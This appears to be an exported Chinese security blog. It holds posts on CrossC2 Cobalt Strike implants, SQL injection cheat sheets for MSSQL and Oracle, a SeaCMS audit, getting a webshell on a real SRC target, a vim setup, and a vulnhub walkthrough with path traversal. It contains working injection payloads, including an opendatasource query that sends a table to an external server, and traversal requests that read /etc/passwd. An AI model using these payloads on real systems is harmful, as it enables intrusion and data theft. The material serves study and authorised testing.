<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mark_OnceBuild_CrossC2Object</title>
      <link href="/2020/07/10/Mark-OnceBuild-CrossC2Object/"/>
      <url>/2020/07/10/Mark-OnceBuild-CrossC2Object/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>在公司项目上，帮客户测试内网安全，有一个linux系统，然后cs生成不了Linux🐎，于是我就找到了CrossC2插件，但是呢，CrossC2有一些有点问题，这里记一次使用CrossC2的<strong>踩坑记</strong></p><a id="more"></a><h1 id="0x01-CrossC2-介绍">0x01 CrossC2 介绍</h1><p>CrossC2 是一款，可以生成 Linux / MacOS 的🐎，蛮强的</p><h1 id="0x02-CrossC2-使用">0x02 CrossC2 使用</h1><p>从Github上面git clone 下来有三个文件，Linux后缀是生成Linux🐎 则 MacOS就是苹果系统的🐎</p><p><img src="1.png" alt="1"></p><p>CrossC2.cna 是Cobalt Strike 的插件。最主要要改动的地方是 77行。之后在CS上加上插件就能看到了。</p><p>我是不推荐从插件里生成拉，那样生成的不是很有效果。</p><p><img src="2.png" alt="2"></p><p>大部分我都是直接使用主程序生成🐎。CrossC2都会给你默认参数，第一个默认的就已经很常用了</p><p><img src="3-1594619515456.png" alt="3"></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>注意:这里是要放进 cs 目录下的，为了方便截图就移出来了</strong></p><p><strong>重要的事情说三遍</strong></p><h1 id="0x03-CrossC2的坑">0x03 CrossC2的坑</h1><p><img src="4.png" alt="4"></p><p><img src="5.png" alt="5"></p><p>开启cs，监听https，坑就在这里</p><p>CrossC2 走的必须是https 才能回显</p><p><img src="6.png" alt="6"></p><p><img src="7.png" alt="7"></p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iseacms代码审计入门级</title>
      <link href="/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/"/>
      <url>/2020/05/14/iseacms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-iseacms-熊海CMS-介绍🅰️">0x01 iseacms 熊海CMS 介绍🅰️</h1><p>熊海CMS是由熊海开发的一款可广泛应用于个人博客，个人网站，企业网站的一套网站综合管理系统。</p><p>简的来说，就非常合适刚刚入门的 代码审计案例（简单到会看一点点php代码的人都会的审计），今天来复盘一下</p><a id="more"></a><p><img src="1.jpg" alt="1"></p><p>（其实已经复盘过了，只是再复盘一遍来充实blog，嘻嘻😄）</p><h1 id="0x02-实战">0x02 实战</h1><p>需要用到 seay源代码审计系统</p><p><img src="2.jpg" alt="2"></p><p>个人喜欢直接上 自动审计所以，走一波</p><p><img src="3.jpg" alt="3"></p><p>seay自动审计出来的，一般不一定100%存在漏洞，它原理是正则去匹配那些函数，比如 eval() 可能就 会写上关于eval() 函数的正则匹配。嘛。不过比起手动慢慢的看，能省去很多麻烦。有能力的也可以先<strong>代码通读</strong> 再自动化审计，每个人方法不一，我就 用我的方法。</p><p><img src="4.jpg" alt="4"></p><p>点过去看到，带有正则匹配和转义的函数。</p><p>正则匹配**\W** 写死了。</p><p><img src="5.jpg" alt="5"></p><p>接着往上看</p><p>/seacmseditor/php/controller.php：11行</p><p><img src="6.jpg" alt="6"></p><p>这三个存在漏洞且能利用。</p><p>需要GET传参 action, <strong>switch 多选函数.</strong></p><p>先第一个uploadfile 上传打开抓包上传试一下。</p><p><img src="7.jpg" alt="7"></p><p>unicode 解码看一下\u672a\u77e5\u9519\u8bef =&gt; 未知错误 🙅</p><p>完美，未知错误</p><p>下一个，SQL注入</p><h1 id="0x03-多处SQL注入">0x03 多处SQL注入</h1><p>/files/content.php：19行</p><p><img src="8.jpg" alt="8"></p><p>加了 转义函数</p><p>可以使用 宽字节注入(有条件)</p><p>报错注入</p><p>这里就使用 报错注入 把</p><p><img src="9.jpg" alt="9"></p><p>宽字节注入需要 GBK编码</p><p><img src="10.jpg" alt="10"></p><p>白盒审计 源代码 里明显没有单独设置 编码所以是不行的。</p><p><img src="11.jpg" alt="11"></p><p>成功报出数据库</p><p>同样存在SQL注入的文件:</p><p>/files/software.php</p><p>/admin/files/reply.php</p><p>/admin/files/newlink.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mark-once-WebShell_01</title>
      <link href="/2020/04/10/takeshell-01/"/>
      <url>/2020/04/10/takeshell-01/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-起因🏴">0x01 起因🏴</h1><p>在做SRC活动的时候。扫描到一个 网站源码备份的网站，于是就打算进一步渗透。看看能不能拿SHELL</p><a id="more"></a><h1 id="0x02-网站SQL注入">0x02 网站SQL注入</h1><p>代码审计功底不太熟，就简单分析了一下文件内容。</p><p>知道了后台管理是/**system/下。然后就去网站看看能不能发现其他的漏洞</p><p><img src="image1.jpeg" alt="image1"></p><p>先走个流程信息收集下。</p><p><img src="E:%5CWeb%5CphpStudy16%5Cblog%5Cblg%5Csource_posts%5Ctakeshell-01%5Cimage3.jpeg" alt="image3"><img src="image2-1586436949788.jpeg" alt="image2"></p><p>惊了。Iis8.5 惹不起惹不起。</p><p>在一个地方找到了一个SQL注入</p><p><img src="image4.jpeg" alt="image4"></p><p><img src="image5.jpeg" alt="image5"></p><p>得劲🔥</p><p><img src="image6.jpeg" alt="image6"></p><p>发现sqlmap跑不出 密码❔于是 我上手工了</p><p><img src="image7.jpeg" alt="image7"></p><p>🖤得嘞。。直接扔进SOMD5里解密。</p><p>登录后台看看</p><p><img src="image8.jpeg" alt="image8"></p><p><img src="image9.jpeg" alt="image9"></p><p>。。。</p><p>。。。</p><p>。。。</p><p>找了一些。能上传的地方，但是都失败了。经验不足不太会。😩</p><p>正思考咋办的时候。突然灵光一闪🌞,咱们不是还有SQL注入嘛。还是MSSQL的数据库</p><p>直接上OS-SHELL</p><h1 id="0x03-WEBSHELL-🌄">0x03 WEBSHELL 🌄</h1><p><img src="image10.jpeg" alt="image10"></p><p>权限有点低嗷。🉑</p><p>上传一句话aspx小马</p><p><img src="image11.jpeg" alt="image11"></p><p><img src="image12.jpeg" alt="image12"></p><p><img src="image13.jpeg" alt="image13"></p><p>百度云的主机，惹不起</p><p>。。</p><p>。。</p><p>。。</p><p>到这里我也就不继续深究了。该删木马的都删了</p><p>本人菜鸟经验不足。提权那些。240个补丁，提不上。也没python环境，</p>]]></content>
      
      
      
        <tags>
            
            <tag> Getshell_Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL_Blind_Injection</title>
      <link href="/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/"/>
      <url>/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>不要问我为什么不配图。因为这个hexo老是渲染失败。搞的我直接裂开了。</p><p><img src="ADF1B901FABD5EA3559C8BE8518DBF08.jpg" alt></p><a id="more"></a><h1 id="0x01-MSSQL盲注-前期知识">0x01 MSSQL盲注_前期知识</h1><p>了解前。先有两个函数要先了解一下count(),object_id()<br>1.union all select count(*) from dbo.sysobjects</p><pre><code class="language-msssql">union all select count(*) from dbo.sysobjectscount指是查询表的所有记录数，也就是无需去order by查询字段数。就能达成回显(只限于盲注8?)=========================================?id=1 union all select null,db_name(),null //查询当前库名 ?id=1 union all select dbid,name,null from master.dbo.sysdatabases //查询当前所有库 dbid 是指数据库的id, master.dbo.sysdatabases 则是来查询库========================================== object_id()简单的一句话总结就是 免去了 查询id unino all select null,name,null from dbo.syscolumns where id=object_id('dbo.admin') //要注意这里要加单引号括起来</code></pre><h1 id="0x02-MSSQL盲注">0x02 MSSQL盲注</h1><pre><code class="language-mssql">#查询库名长度?id=1 and (select count(*)from master.dbo.databases where dbid=1 and len(name)=4)=1====================================================#查询库名?id=1 and (select count(*) from master.dbo.databases where dbid=1 and ascii(substring(name,1,1))=100)=1===================================================#查询表名?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U')and ascii(substring(name,1,1))=100)=1?id=1 and (select count(*) from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where xtype='U' and name not in('zkaq'))and ascii(substring(name,1,1))=100)=1tips: (top 1) 是指查询最大值的那一个==================================================#查询字段名(假设已猜出表名(zkaq666))?id=1 and (select count(*)from dbo.sysobjects where name in(select top 1 name from dbo.sysobjects where id=object_id('dbo.zkaq666'))and ascii(substring(name,1,1))=100)=1====================================================#查询字段内容(假设已猜出字段名(username))?id=1 and (select count(*) from dbo.zkaq666 where username in(select top 1 username from dbo.zkaq666)and ascii(substring(username,1,1))=100)=1</code></pre><h1 id="0x03-总结">0x03 总结</h1><p><strong>很他妈简单。看不懂的自己去试一试！</strong></p><hr><p><strong>参考连接link:<br><a href="https://blog.csdn.net/v_gbird/article/details/93981684" target="_blank" rel="noopener">https://blog.csdn.net/v_gbird/article/details/93981684</a><br><a href="https://blog.csdn.net/kuxing100/article/details/9670533" target="_blank" rel="noopener">https://blog.csdn.net/kuxing100/article/details/9670533</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle Injection</title>
      <link href="/2020/02/20/Oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/20/Oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1><a id="more"></a><p>所用到的语句</p><ul><li>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(payload))</li><li>table_name&lt;&gt;‘ADMIN’    //&lt;&gt;意思是 不等于。也就是排除</li></ul><p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select table_name from user_tables from rownum=1))</p><ul><li>⏫rownum指，限制输出只输出一个。查询表</li></ul><p><img src="5.jpg" alt="5"></p><p>and <a href="http://1=ctxsys.drithsx.sn" target="_blank" rel="noopener">1=ctxsys.drithsx.sn</a>(1,(select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1))</p><p><img src="8.jpg" alt="8"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL Injection</title>
      <link href="/2020/02/20/MSSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/20/MSSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1><a id="more"></a><p>union all select db_name()  //查询当前库名<br>union all select null,name,null from master.dbo.sysdatabases//查询数据库<br>union all select null,null,null from dbo.sysobjects //查询表<br>union all select null,null,null from dbo.syscolumns//查询字段</p><hr><p><strong>查询数据库</strong>💻</p><p>?id=1 union all select null,name,null from master.dbo.stsdatabases</p><p><img src="12312321321.jpg" alt="12312321321"></p><p><strong>查询表名</strong>📑</p><p>?id=1 union all select id,name,null from dbo.sysobjects where xtype=‘U’</p><ul><li>⏫id 和 name 是系统自带的字段名。查询完需要记住，你要查询的表ID。xtype='U’是指用户创建的表</li></ul><p><img src="2.jpg" alt="1"></p><p><strong>查询字段名</strong></p><p>?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx</p><ul><li><p>⏫ null是指3个字段。mssql里的字符串类型管理严格，有可能一个是int类型。或者str类型等。</p><p><img src="3.jpg" alt="2"></p></li></ul><p><strong>查询字段内容</strong></p><p>?id=1 union all select null,password,null from admin</p><p><img src="4.jpg" alt="3"></p><h1 id="0x02-MSSQL-反弹注入🎈">0x02 MSSQL 反弹注入🎈</h1><ul><li><strong>前言</strong>:</li></ul><p>这个是一个比较骚的操作。针对无回显注入点的时候。</p><h2 id="0x02-1-反弹注入原理">0x02.1 反弹注入原理</h2><ul><li>☂️MSSQL注射攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路，而反弹注入技术需要依靠opendatasource函数支持</li><li></li></ul><h2 id="0x02-2-反弹注入条件">0x02.2 反弹注入条件</h2><ul><li>🌐需要一台外网主机，字段要相同</li></ul><h3 id="复现">复现</h3><ul><li>Payload🔫</li></ul><p>insert into opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin</p><ul><li>句子理解</li></ul><p>opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin</p><ul><li>建立temp表4个字段</li></ul><p>create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255))</p><ul><li>插入语句后查询</li></ul><p><img src="6.jpg" alt="6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim-vundle install and configuration</title>
      <link href="/2019/12/15/vim-vundle%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/12/15/vim-vundle%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>想在pycharm使用 pwntools 但是 pwntools不支持windows。只能跑到Linux搞，但是Vim没有补全于是打算装个 补全插件。顺便写个笔记</p><a id="more"></a><p><strong>环境：Kali</strong></p><h1 id="0x01-Vundle插件管理安装">0x01 Vundle插件管理安装</h1><p>我用的是kali和普通安装有些不同。</p><p>第一步 git：</p><pre><code class="language-bash">git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</code></pre><p>在 用户 下<strong>建立.vimrc文件</strong> 例子：</p><p>user:/user/.vimrc</p><p>root:/root/.vimrc</p><p>写上以下的句子</p><pre><code class="language-bash">set nocompatible              &quot; be iMproved, requiredfiletype off                  &quot; required&quot; set the runtime path to include Vundle and initializeset rtp+=~/.vim/bundle/Vundle.vimcall vundle#begin()Plugin 'VundleVim/Vundle.vim'Plugin 'tpope/vim-fugitive'Plugin 'L9'call vundle#end()            &quot; requiredfiletype plugin indent on    &quot; required</code></pre><p>打开VIM 直接打开不用配合其他文件什么的。</p><p>输入 :PluginInstall。安装完后更新一下 :PluginUpdate</p><p>等显示Done！的字的时候就代表的 安装/更新 成功</p><pre><code class="language-shell">call vundle#begin()'''#插件名称位置call vundle#end()</code></pre><p>如果我这里不详细，可以去github看原版的档案</p><p>地址：<a href="https://github.com/VundleVim/" target="_blank" rel="noopener">https://github.com/VundleVim/</a></p><h1 id="0x02-vim安装molokai配色方案">0x02 vim安装molokai配色方案</h1><p>我安装完插件后，字体没了颜色。我也没看出问题所在。字体颜色脚本都没有加载。所以我打算直接使用vim的插件。不使用自带的颜色脚本</p><p>直接git 下来</p><pre><code class="language-shell">git clone https://github.com/tomasr/molokai.git</code></pre><p>然后 mv molokai/ /usr/share/(你的vim版本)/colors/ 下。</p><p>并在.vimrc文件 后面加上</p><pre><code class="language-shell">colorsheme molokailet g:molokai_original=1set t_Co=256set background=draksyntax onset nu!</code></pre><p>保存并退出。过会就会生效了。</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub_sunrise</title>
      <link href="/2019/12/15/vulnhub%E9%9D%B6%E6%9C%BA-sunrise/"/>
      <url>/2019/12/15/vulnhub%E9%9D%B6%E6%9C%BA-sunrise/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>前几天逛了一下vulnhub,看到比较适合新手的靶机。就下载下来玩玩。</p><p>可没想到一个坑，坑了我两天半，共用计两天半。</p><p>有句话我想讲一下 **************************!!!</p><a id="more"></a><h1 id="0x01-Sunrise">0x01 Sunrise</h1><p>靶机地址: <a href="https://download.vulnhub.com/sunset/sunrise.7z" target="_blank" rel="noopener">https://download.vulnhub.com/sunset/sunrise.7z</a></p><p>作者: whitecr0wz</p><p>难度: Beginner(新手)</p><h3 id="0x01-1-信息收集">0x01.1 信息收集</h3><p>nmap -n -T4 172.16.123.109 -A</p><pre><code class="language-xml">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CSTStats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 (0:00:00 remaining)Nmap scan report for 172.16.123.109Host is up (0.00011s latency).Not shown: 996 closed portsPORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey:|   2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA)|   256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA)|_  256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519)80/tcp   open  http       Apache httpd 2.4.38 ((Debian))| http-ls: Volume /| SIZE  TIME              FILENAME| 612   2019-11-25 05:35  index.nginx-debian.html|_|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Index of /3306/tcp open  mysql?| fingerprint-strings:|   NULL, RPCCheck:|_    Host '172.16.123.230' is not allowed to connect to this MariaDB server8080/tcp open  http-proxy Weborf (GNU/Linux)| fingerprint-strings:|   FourOhFourRequest:|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)|     Content-Length: 202|     Content-Type: text/html|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;|   GetRequest:|     HTTP/1.1 200|     Server: Weborf (GNU/Linux)|     Content-Length: 326|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;|     &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;|   HTTPOptions, RTSPRequest, SIPOptions:|     HTTP/1.1 200|     Server: Weborf (GNU/Linux)|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE|     DAV: 1,2|     DAV: &lt;http://apache.org/dav/propset/fs/1&gt;|     MS-Author-Via: DAV|   Socks5:|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)|     Content-Length: 199|     Content-Type: text/html|_    &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;| http-methods:|_  Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE|_http-server-header: Weborf (GNU/Linux)|_http-title: Weborf| http-webdav-scan:|   Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE|   WebDAV type: Apache DAV|_  Server Type: Weborf (GNU/Linux)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(NSF:ULL,4D,&quot;I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20aSF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(RPCCheckSF:,4D,&quot;I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20alloSF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(GSF:etRequest,187,&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\rSF:\nContent-Length:\x20326\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3CSF://DTD\x20HTML\x204\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;SF:/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;SF:&lt;tr\x20style=\&quot;background-color:\x20#DFDFDF;\&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a\x20hrefSF:=\&quot;html/\&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;p&gt;Generated\x20by\x2SF:0Weborf/0\.12\.2\x20\(GNU/Linux\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,B2,SF:&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GESF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDASF:V:\x20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\nMS-Author-Via:\x20DAV\r\SF:n\r\n&quot;)%r(RTSPRequest,B2,&quot;HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNSF:U/Linux\)\r\nAllow:\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,SF:MOVE\r\nDAV:\x201,2\r\nDAV:\x20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\SF:nMS-Author-Via:\x20DAV\r\n\r\n&quot;)%r(FourOhFourRequest,12B,&quot;HTTP/1\.1\x20SF:404\x20Page\x20not\x20found:\x20Weborf\x20\(GNU/Linux\)\r\nContent-LengSF:th:\x20202\r\nContent-Type:\x20text/html\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUSF:BLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;heaSF:d&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\x20&lt;H1&gt;Error\x20404&lt;/H1&gt;Page\x20noSF:t\x20found\x20&lt;p&gt;Generated\x20by\x20Weborf/0\.12\.2\x20\(GNU/Linux\)&lt;/pSF:&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(Socks5,125,&quot;HTTP/1\.1\x20400\x20Bad\x20request:\x20SF:Weborf\x20\(GNU/Linux\)\r\nContent-Length:\x20199\r\nContent-Type:\x20tSF:ext/html\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x2SF:04\.01\x20Transitional//EN\&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;bSF:ody&gt;\x20&lt;H1&gt;Error\x20400&lt;/H1&gt;Bad\x20request\x20&lt;p&gt;Generated\x20by\x20WeSF:borf/0\.12\.2\x20\(GNU/Linux\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(SIPOptions,B2,&quot;HTTSF:P/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GET,POSF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDAV:\xSF:20&lt;http://apache\.org/dav/propset/fs/1&gt;\r\nMS-Author-Via:\x20DAV\r\n\r\SF:n&quot;);MAC Address: 00:0C:29:22:ED:7F (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.11 ms 172.16.123.109OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds</code></pre><p><strong>开放的端口:</strong></p><p>​22/tcp ssh openssh 7.9</p><p>​80/tcp http apache</p><p>​3306/tcp mysql?</p><p>​8080/tcp http-proxy Weborf</p><p>80/tcp http</p><p><img src="%E6%8D%95%E8%8E%B7.png" alt="捕获"></p><p><img src="%E6%8D%95%E8%8E%B71.png" alt="捕获1"></p><p>没有任何东西</p><p>mysql连不上</p><p>看向 8080端口</p><p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="捕获2"></p><p>看了看版本</p><p>用searchsploit搜索一下看看有没有漏洞存在</p><p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="捕获3"></p><p>存在目录穿梭</p><p>看了看具体payload:</p><pre><code class="language-html">GET /..%2f..%2f..%2f..%2fetc%2fpasswd</code></pre><p>就是把 / 转成 html编码 %2f</p><p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="捕获4"></p><p>成功。</p><p>目录穿梭最主要的就是找 敏感文件信息.</p><p>看看有没有<strong>敏感文件</strong>尤其是 历史记录那些，配置文件等</p><pre><code class="language-html">GET /..%2f..%2f..%2fhome%2f</code></pre><p><img src="%E6%8D%95%E8%8E%B75.PNG" alt="捕获5"></p><p>home下存在两个用户,两个用户下存在的文件：</p><ul><li><p>sunrise</p><p>|_user.txt</p></li><li><p>weborf</p><p>|_weborf源码</p></li></ul><p><strong>注意！这里是短路的路口，user.txt 是一个坑。重点不在这里</strong></p><p>想到端口开放了mysql，于是就百度了一下 mysql的敏感文件</p><pre><code>/usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件  /usr/local/apache2/conf/httpd.conf  /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置  /usr/local/app/php5/lib/php.ini #PHP相关设置 /etc/sysconfig/iptables #从中得到防火墙规则策略  /etc/httpd/conf/httpd.conf #apache配置文件  /etc/rsyncd.conf #同步程序配置文件  /etc/my.cnf #mysql的配置文件  /etc/redhat-release #系统版本  /etc/issue  /etc/issue.netetc/passwd #存储操作系统用户信息,该文件为所有用户可见用户名: 密码 : uid  : gid :用户描述：主目录：登陆shell密码：x表示暗文,相反为明文uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户 　　伪用户（psuedo users）　　　　bin #拥有可执行的用户命令文件　　　　sys #拥有系统文件　　　　adm #拥有账户文件　　　　uucp #UUCP使用　　　　Ip #Ip或lpd子系统使用　　　　nobody #NFS使用　　　　audit　　　　cron　　　　mail　　　　usenetgid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录　用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等　　  主目录：用户的起始工作目录　  登陆shell：　　　　　　常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)　　　　　　/bin/sh #默认登录Shell   /sbin/nologin #代表用户不能登录 /etc/shadowusername: passwd: lastchg: min: max: warn: inactive: expire: flag登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合{./0-9A-Za-z}中的字符/用户不能登录最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同最小时间间隔 - 两次修改口令之间所需的最小天数最大时间间隔 - 口令保持有效的最大天数警告时间  - 从系统开始警告用户到用户密码正式失效之间的天数不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数失效时间 - 账号的生存期。保留条目 - 无用字段/etc/group 存储有关本地用户组的信息一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员1）groupname GID 